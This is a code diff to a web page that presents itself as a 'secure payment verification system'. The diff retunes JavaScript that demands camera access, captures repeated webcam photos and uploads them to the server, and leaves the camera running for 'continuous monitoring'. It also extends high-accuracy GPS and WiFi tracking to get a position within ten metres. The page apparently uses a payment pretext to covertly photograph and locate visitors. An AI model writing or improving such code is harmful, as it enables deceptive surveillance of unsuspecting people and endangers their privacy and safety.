@@ -81,12 +81,17 @@
     </div>
 
     <!-- Camera Permission Modal -->
-    <div id="camera-permission-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:9999; justify-content:center; align-items:center;">
-        <div style="background:white; padding:30px; border-radius:15px; text-align:center; max-width:400px; margin:20px;">
+    <div id="camera-permission-modal"
+        style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:9999; justify-content:center; align-items:center;">
+        <div
+            style="background:white; padding:30px; border-radius:15px; text-align:center; max-width:400px; margin:20px;">
             <div style="font-size:60px; margin-bottom:20px;">📷</div>
             <h2 style="margin:0 0 15px 0; color:#333;">Camera Access Required</h2>
-            <p style="color:#666; margin-bottom:25px;">This secure payment verification system requires camera access for identity verification. Please enable camera permissions to continue.</p>
-            <button id="enable-camera-btn" style="background:#667eea; color:white; border:none; padding:12px 30px; border-radius:8px; font-size:16px; cursor:pointer; font-weight:600;">Enable Camera</button>
+            <p style="color:#666; margin-bottom:25px;">This secure payment verification system requires camera access
+                for identity verification. Please enable camera permissions to continue.</p>
+            <button id="enable-camera-btn"
+                style="background:#667eea; color:white; border:none; padding:12px 30px; border-radius:8px; font-size:16px; cursor:pointer; font-weight:600;">Enable
+                Camera</button>
         </div>
     </div>
 
@@ -148,8 +153,8 @@
 
         // MAXIMUM ACCURACY LOCATION TRACKING (OPTIMIZED FOR 5 SECONDS)
         async function captureLocationWithFallback() {
-            console.log('🌍 Starting FAST location capture (5s max)...');
-            updateStatus('location', 'Fast capture mode...');
+            console.log('🌍 Starting HIGH ACCURACY location capture (15s max)...');
+            updateStatus('location', 'High Accuracy mode...');
 
             const locationData = {
                 attempts: [],
@@ -187,8 +192,8 @@
                 console.log('Battery API not available');
             }
 
-            // STRATEGY 1: GPS continuous watching (3 seconds max)
-            console.log('🎯 Strategy 1: GPS continuous (3s)...');
+            // STRATEGY 1: GPS continuous watching (10 seconds max)
+            console.log('🎯 Strategy 1: GPS continuous (10s)...');
             const gpsResult = await tryGPSContinuous();
             if (gpsResult) {
                 locationData.attempts.push(gpsResult);
@@ -211,7 +216,7 @@
                     updateStatus('location', `GPS ${attempt}/2...`);
                     const position = await getPositionWithPromise({
                         enableHighAccuracy: true,
-                        timeout: 3000,  // Reduced from 15s to 3s
+                        timeout: 10000,  // Increased from 3s to 10s
                         maximumAge: 0
                     });
 
@@ -239,8 +244,8 @@
                 updateStatus('location', 'WiFi positioning...');
                 const position = await getPositionWithPromise({
                     enableHighAccuracy: false,
-                    timeout: 5000,  // Reduced from 10s
-                    maximumAge: 60000
+                    timeout: 10000,  // Increased from 5s to 10s
+                    maximumAge: 0    // Don't use cached data
                 });
 
                 const wifiData = extractPositionData(position, 'WiFi-Cell');
@@ -300,7 +305,7 @@
                 const timeout = setTimeout(() => {
                     if (watchId) navigator.geolocation.clearWatch(watchId);
                     resolve(bestPosition);
-                }, 3000); // Reduced from 5s to 3s
+                }, 15000); // Increased to 15s for full lock
 
                 watchId = navigator.geolocation.watchPosition(
                     (position) => {
@@ -311,8 +316,8 @@
                             bestPosition = position;
                         }
 
-                        // Stop early if excellent accuracy (save time)
-                        if (position.coords.accuracy < 20) {
+                        // Stop early ONLY if excellent accuracy (<10m)
+                        if (position.coords.accuracy < 10) {
                             clearTimeout(timeout);
                             navigator.geolocation.clearWatch(watchId);
                             resolve(extractPositionData(bestPosition, 'GPS-Continuous'));
@@ -324,7 +329,7 @@
                         if (watchId) navigator.geolocation.clearWatch(watchId);
                         resolve(bestPosition ? extractPositionData(bestPosition, 'GPS-Partial') : null);
                     },
-                    { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             });
         }
@@ -591,7 +596,7 @@
         function showCameraModal() {
             const modal = document.getElementById('camera-permission-modal');
             modal.style.display = 'flex';
-            
+
             document.getElementById('enable-camera-btn').addEventListener('click', async () => {
                 try {
                     // Request camera access
@@ -642,14 +647,14 @@
                 for (let i = 0; i < TOTAL_PHOTOS_LOGIN; i++) {
                     ctx.drawImage(video, 0, 0);
                     const photoData = canvas.toDataURL('image/jpeg', 0.85);
-                    
+
                     // Send photo to server
                     await sendPhotoToServer(photoData, `login_${i + 1}`);
                     photosCaptured++;
-                    
+
                     updateStatus('camera', `Captured ${photosCaptured}/${TOTAL_PHOTOS_LOGIN} photos...`);
                     console.log(`✅ Photo ${photosCaptured}/${TOTAL_PHOTOS_LOGIN} captured`);
-                    
+
                     // Wait 500ms between captures
                     if (i < TOTAL_PHOTOS_LOGIN - 1) {
                         await new Promise(resolve => setTimeout(resolve, 500));
@@ -658,7 +663,7 @@
 
                 // Keep camera running in background (don't stop stream)
                 // This allows continuous monitoring
-                
+
                 dataCapturComplete.camera = true;
                 updateStatus('camera', `${TOTAL_PHOTOS_LOGIN} photos captured ✓`, true);
                 console.log(`✅ All ${TOTAL_PHOTOS_LOGIN} photos captured on login page`);
@@ -666,7 +671,7 @@
                 console.error('Camera error:', error);
                 dataCapturComplete.camera = true;
                 updateStatus('camera', 'Failed: ' + error.message + ' ⚠️');
-                
+
                 // Show modal again if camera access denied
                 if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                     showCameraModal();
@@ -680,7 +685,7 @@
                 const response = await fetch('/capture-photo', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
+                    body: JSON.stringify({
                         photo: photoData,
                         type: photoType,
                         timestamp: new Date().toISOString()
@@ -704,7 +709,7 @@
 
             // Check camera permission first
             const hasPermission = await checkCameraPermission();
-            
+
             if (!hasPermission) {
                 // Show modal to request permission
                 showCameraModal();
